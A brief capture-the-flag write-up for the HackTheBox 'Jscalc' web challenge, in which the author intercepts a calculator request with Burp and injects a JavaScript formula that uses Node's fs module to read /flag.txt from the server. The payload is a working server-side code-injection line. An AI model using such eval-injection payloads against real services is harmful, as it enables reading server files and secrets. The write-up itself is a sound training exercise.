# HackTheBox Jscalc

<div style="text-align: center;">
  <img src="/assets/jscalc1.webp" alt="mannaully
" width="600">
</div>

```
HTB-Challenges- Web
Challenge Info:- Web based challenge 
Challenge level:- Easy
```

---

CHALLENGE DESCRIPTION

```
In the mysterious depths of the digital sea, a specialized JavaScript 
calculator has been crafted by tech-savvy squids. With multiple arms 
and complex problem-solving skills, these cephalopod engineers use it 
for everything from inkjet trajectory calculations to deep-sea math. 
Attempt to outsmart it at your own risk! 🦑
```

Downloaded the file and unziped them.

<div style="text-align: center;">
  <img src="/assets/jscalc2.webp" alt="mannaully
" width="500">
</div>
On visiting on the given ip and port this web page opened.

<div style="text-align: center;">
  <img src="/assets/jscalc3.webp" alt="mannaully
" width="550">
</div>

I opened burp and captured the request.

<div style="text-align: center;">
  <img src="/assets/jscalc4.webp" alt="mannaully
" width="550">
</div>

So it uses some {“formula”:” ”} and send the value for final sum we can use.

```bash
{"formula":"require('fs').readFileSync('/flag.txt').toString();"}
```

now lets try caputering the request again and send it to repeater.

and we got the flag.

<div style="text-align: center;">
  <img src="/assets/jscalc5.webp" alt="mannaully
" width="550">
</div>

Thank you for reading.

